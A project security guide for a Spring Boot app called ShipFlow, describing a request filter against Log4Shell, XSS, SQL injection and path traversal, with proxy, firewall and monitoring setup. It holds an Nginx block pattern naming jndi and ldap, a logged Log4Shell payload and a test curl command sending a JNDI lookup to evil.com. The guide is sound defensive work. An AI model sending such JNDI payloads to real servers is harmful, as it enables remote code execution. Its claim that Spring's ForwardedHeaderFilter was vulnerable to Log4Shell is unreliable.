# Security Guide - ShipFlow

## Overview
This document outlines the security measures implemented in ShipFlow to protect against common attack vectors.

## Implemented Security Measures

### 1. Malicious Request Detection & Blocking

**Component**: `MaliciousHeaderFilter.java`

The application implements a custom servlet filter that inspects all incoming HTTP requests for malicious patterns before they reach the application logic.

#### Protected Attack Vectors:

1. **Log4Shell (CVE-2021-44228) / JNDI Injection**
   - Detects `${jndi:ldap://...}` patterns
   - Blocks environment variable interpolation attempts
   - Prevents remote code execution via logging

2. **Cross-Site Scripting (XSS)**
   - Blocks `<script>` tags in headers
   - Detects JavaScript event handlers (`onerror=`, `onload=`)
   - Prevents JavaScript protocol injection

3. **SQL Injection**
   - Detects suspicious SQL characters in headers
   - Blocks common SQL injection patterns

4. **Path Traversal**
   - Blocks `../` and `..\` patterns
   - Prevents directory traversal attacks

5. **Header Injection Attacks**
   - Validates length limits (max 1000 chars)
   - Blocks null byte injection (`%00`, `\0`)
   - Prevents LDAP/RMI/DNS protocol abuse

#### Monitored Headers:
- `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`
- `Forwarded`, `Host`, `X-Real-IP`
- `User-Agent`, `Referer`
- All request URIs and query strings

#### Response to Threats:
- **HTTP 400 Bad Request** returned immediately
- Security event logged with:
  - Client IP address
  - Request details (URI, method)
  - Malicious payload (sanitized)
  - User-Agent
- Request blocked before reaching business logic

### 2. Spring Framework Security

**Component**: `SecurityConfig.java`

#### ForwardedHeaderFilter Protection:
```properties
# Disabled to prevent malicious header exploitation
server.forward-headers-strategy=none
```

The default Spring `ForwardedHeaderFilter` was vulnerable to the Log4Shell attack in your logs. We've:
- Disabled it via `server.forward-headers-strategy=none`
- Replaced with custom `MaliciousHeaderFilter` that validates before processing
- Maintained legitimate remote IP tracking via Tomcat configuration

#### Trusted Proxies:
```properties
server.tomcat.remoteip.internal-proxies=127\\.0\\.0\\.1|::1|10\\..*|192\\.168\\..*
```
Only accept forwarded headers from local/private network proxies.

### 3. Dependency Security

#### Spring Boot Version: 3.2.1
- Includes Log4j 2.17.1+ (patched for Log4Shell)
- Regular security updates via Spring Boot parent POM

#### Recommendations:
```bash
# Check for vulnerabilities
./mvnw org.owasp:dependency-check-maven:check

# Update dependencies regularly
./mvnw versions:display-dependency-updates
```

### 4. Production Deployment Security

#### Reverse Proxy Configuration (Nginx/Caddy):

**Nginx:**
```nginx
# Block suspicious User-Agents
if ($http_user_agent ~* (jndi|ldap|${|eval|exec)) {
    return 403;
}

# Rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req zone=api burst=20 nodelay;

# Header size limits
large_client_header_buffers 2 1k;

# Only allow forwarded headers from trusted sources
set_real_ip_from 10.0.0.0/8;
set_real_ip_from 172.16.0.0/12;
set_real_ip_from 192.168.0.0/16;
real_ip_header X-Forwarded-For;
```

**Caddy:**
```caddyfile
shipflow.example.com {
    # Rate limiting
    rate_limit {
        zone static {
            key {remote_host}
            events 100
            window 1m
        }
    }
    
    # Security headers
    header {
        X-Frame-Options "SAMEORIGIN"
        X-Content-Type-Options "nosniff"
        X-XSS-Protection "1; mode=block"
        Referrer-Policy "strict-origin-when-cross-origin"
        Permissions-Policy "geolocation=(), microphone=(), camera=()"
    }
    
    reverse_proxy localhost:8080
}
```

#### Firewall Rules:
```bash
# Allow only necessary ports
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 22/tcp
sudo ufw deny 8080/tcp  # Block direct access to Spring Boot

# Enable firewall
sudo ufw enable
```

#### Environment Variables (Production):
```bash
# Use strong JWT secret (256-bit minimum)
APP_JWT_SECRET=$(openssl rand -base64 32)

# Disable H2 console
SPRING_H2_CONSOLE_ENABLED=false

# Production logging level
LOGGING_LEVEL_ROOT=WARN
LOGGING_LEVEL_COM_GITHUB_FARZADSEDAGHATBIN=INFO
```

### 5. Security Monitoring

#### Log Monitoring:
The `MaliciousHeaderFilter` logs all blocked requests with 🚨 prefix:

```log
🚨 SECURITY ALERT: Malicious request blocked
Source IP: 31.57.109.131
Request URI: /api/qa/ask
Method: POST
Malicious Header/Field: X-Forwarded-Host
Payload: ${jndi:ldap://31.57.109.131:3306/...
User-Agent: python-requests/2.28.0
```

#### Recommended Monitoring Tools:
1. **Log Aggregation**: 
   - ELK Stack (Elasticsearch, Logstash, Kibana)
   - Datadog
   - Splunk

2. **Security Monitoring**:
   - Fail2ban (auto-ban IPs after repeated attacks)
   - OSSEC (intrusion detection)
   - Cloudflare (DDoS protection)

3. **Alerting**:
   Update `MaliciousHeaderFilter.logSecurityEvent()` to send alerts:
   ```java
   // Send to Slack/PagerDuty/Email
   securityAlertService.sendAlert(clientIp, headerName, value);
   ```

### 6. Regular Security Audits

#### Automated Scanning:
```bash
# OWASP Dependency Check
./mvnw org.owasp:dependency-check-maven:check

# Snyk security scan
snyk test

# Trivy container scanning
trivy image shipflow:latest
```

#### Manual Testing:
```bash
# Test malicious header blocking
curl -H "X-Forwarded-Host: \${jndi:ldap://evil.com}" http://localhost:8080/api/qa/ask

# Expected response: HTTP 400 with {"error":"Malicious request detected and blocked"}
```

### 7. Docker Security

**Dockerfile best practices:**
```dockerfile
# Use official, minimal base images
FROM eclipse-temurin:17-jre-alpine

# Run as non-root user
RUN addgroup -S shipflow && adduser -S shipflow -G shipflow
USER shipflow

# Read-only filesystem
VOLUME /tmp
RUN chmod -R 755 /app
```

### 8. Additional Hardening Checklist

- [ ] Enable HTTPS only in production
- [ ] Implement Content Security Policy (CSP)
- [ ] Use Helmet.js for additional headers (if using Node.js frontend server)
- [ ] Enable HSTS (HTTP Strict Transport Security)
- [ ] Implement rate limiting at application level
- [ ] Regular dependency updates (weekly)
- [ ] Security headers in responses
- [ ] Input validation on all endpoints
- [ ] Parameterized queries (prevent SQL injection)
- [ ] Principle of least privilege for database users
- [ ] Regular backup and disaster recovery testing
- [ ] Penetration testing (quarterly)

## Incident Response

If you detect a security incident:

1. **Immediate**: Block the attacking IP at firewall level
2. **Investigate**: Review logs for scope of attack
3. **Patch**: Update dependencies if vulnerability found
4. **Report**: Document incident and response
5. **Monitor**: Increase monitoring for similar patterns

## Compliance

This implementation helps meet:
- **OWASP Top 10** security requirements
- **CWE-117** (Log Injection)
- **CVE-2021-44228** (Log4Shell)
- **PCI DSS** requirement 6.5 (secure coding practices)

## Contact

For security concerns, contact: farzad.sedaghatbin@gmail.com

**Last Updated**: January 2026
